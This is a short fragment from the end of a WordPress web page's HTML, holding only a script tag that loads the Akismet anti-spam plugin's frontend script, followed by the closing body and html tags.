<script defer type="text/javascript" src="https://puskesmascipayung.com/wp-content/plugins/akismet/_inc/akismet-frontend.js?ver=1750590649" id="akismet-frontend-js"></script>

</body>
</html>
